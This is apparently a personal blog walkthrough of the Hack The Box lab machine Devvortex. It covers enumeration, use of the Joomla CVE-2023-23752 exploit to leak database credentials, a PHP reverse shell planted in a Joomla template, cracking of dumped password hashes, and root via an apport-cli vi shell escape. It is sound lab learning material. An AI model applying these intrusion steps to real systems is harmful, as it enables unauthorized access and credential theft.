---
title: Hack the box Devvortex pwned!
date: 2024-02-13 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, machine, devvortex, joomla, mysql]
img_path: /assets/img/posts/
---

## Machine info

![Devvortex info](htb-devvortex-info.png)
*Devvortex info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.0.0.1
>
>Target machine (victim, Devvortex): 10.10.11.242
{: .prompt-info}

## Enumeration

If we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):

`sudo map -Pn -n -sS -p- --open -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.242`

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Footprinting

If we look for more information about the services running in those ports we will find the machine address:

`sudo nmap -sVC -p22,80 -oN nmap_initial_versions.txt 10.10.11.242`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Now, we add the machine address to our `/etc/hosts`:

`echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts`

We browse to `http://devvortex.htb` and we investigate the web:

![Devvortex web](htb-devvortex-web.png)
*Devvortex web*

We can't do anything on this web, but, if we look for virtual hosts we will find `dev.devvortex.htb`.
`dev`? Sounds interesting...

```
ffuf -c -mc 200 -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.242 -H "HOST: FUZZ.devvortex.htb"
...
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502]
```

We add this new host to our `/etc/hosts`:

`echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts`

And, now, we browse to our new devvortex web

![dev.devvortex web](htb-devdevvortex-web.png)
*dev.devortex web*

### Joomla

Using `wappalyzer` we can see that is a `joomla cms`:

![dev.devvortex web info](htb-devdevvortex-web-wappalyzer.png)
*dev.devortex web info*

We take a look with [joomscan](https://github.com/OWASP/joomscan) and we found that is running a 4.2.6 version and some interesting paths in `robots.txt`:

```
[+] Detecting Joomla Version
[++] Joomla 4.2.6
...
[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/
```

## Foothold

Taking a further look we find that is a jommla vulnerable version:

```
searchsploit joomla | grep -i v4.2  
Joomla! v4.2.8 - Unauthenticated information disclosure
```

```
searchsploit -p 51334 
  Exploit: Joomla! v4.2.8 - Unauthenticated information disclosure
      URL: https://www.exploit-db.com/exploits/51334
     Path: /opt/exploitdb/exploits/php/webapps/51334.py
    Codes: CVE-2023-23752
 Verified: True
File Type: Ruby script, ASCII text
```

We can see that the exploit it's a ruby script, but, with python extension.
We copy it to a working folder and we install the gems required by the script:

```
cp /opt/exploitdb/exploits/php/webapps/51334.py /home/rubenhortas/devvortex/exploits/51334.rb
```
```
sudo gem install httpx docopt paint
```

Once we have everything ready we run the exploit:

```
./51334.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: f4k3l0g4np455
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

### lewis

Now, we have two users, and one of them with its password.
So we will try to log in as administrators in `http://dev.devvortex.htb/administrator`

![dev.devvortex login](htb-devdevvortex-login.png)
*dev.devortex login*

And... We are in!

### www-data

Now, we need to perform a lateral movement to gain shell as the user `www-data`.
In order to do this, we will exploit the joomla template system to gain a reverse shell.

We browse to System > Site Templates > Cassiopeia Details and Files and we inject a php shell in the `error.php` (because is writable) template:

![dev.devvortex php shell](htb-devdevvortex-php-shell.png)
*dev.devortex php shell*

We save the change, and we start listening in our host with `netcat`:

`nc -lvnp 1234`

And, now, we cause a browsing error, navigating to an unexisting url, e.g.: `http://dev.devvortex.htb/asdf`

Once we get shell, the first thing it's upgrating the tty, as always:

```
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm-256color
stty rows 56 columns 209
```

```
www-data@devvortex:~/dev.devvortex.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If we look in the `configuration.php` file we found the database and the credentials:

```
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php | grep -E 'user|password|\$db' 
        public $dbtype = 'mysqli';
        public $user = 'lewis';
        public $password = 'f4k3l0g4np455';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $smtpuser = ''
```

We connect to the database and we extract the users information:

```
mysql -u lewis -pf4k3l0g4np455 joomla

mysql> show tables like '%user%';
+---------------------------+
| Tables_in_joomla (%user%) |
+---------------------------+
| sd4fg_action_logs_users   |
| sd4fg_user_keys           |
| sd4fg_user_mfa            |
| sd4fg_user_notes          |
| sd4fg_user_profiles       |
| sd4fg_user_usergroup_map  |
| sd4fg_usergroups          |
| sd4fg_users               |
+---------------------------+
8 rows in set (0.00 sec)

mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-02-13 13:20:06 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

Now, we crack the `logan` hashed password using `hashcat`.
Fisrt, we save the hashed password in the `hash.txt` file, then we execute `hashcat`:

```
hashcat -a 0 -m 3200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

After a while...

### logan

With the `logan` password we can perform a new lateral movement and connect as `logan` using `ssh`:

```
ssh logan@10.10.11.242
```

### User flag

We can get our user flag now:

```
cat user.txt
```

## Privilege escalation

We check our sudo cappabilities and we find that we can execute `/usr/bin/apport-cli` as root:

```
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

We take a look and we can see that the binary is used to report crash records:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

We  create a bug report for any package in the system, e.g. `at`:

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -f at

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.....................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (3.0 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):
```

We choose "V: View report", and we are inside a `vi` enviroment.
Luckly for us we can escape executing a bash shell:

```
!/bin/bash
```

Finally, we are root and we can get our system flag!

```
cat /root/root.txt
```

## Pwned

![Devvortex pwned](htb-devvortex-pwned.png)
*Devvortex has been Pwned*

*Enjoy! ;)*
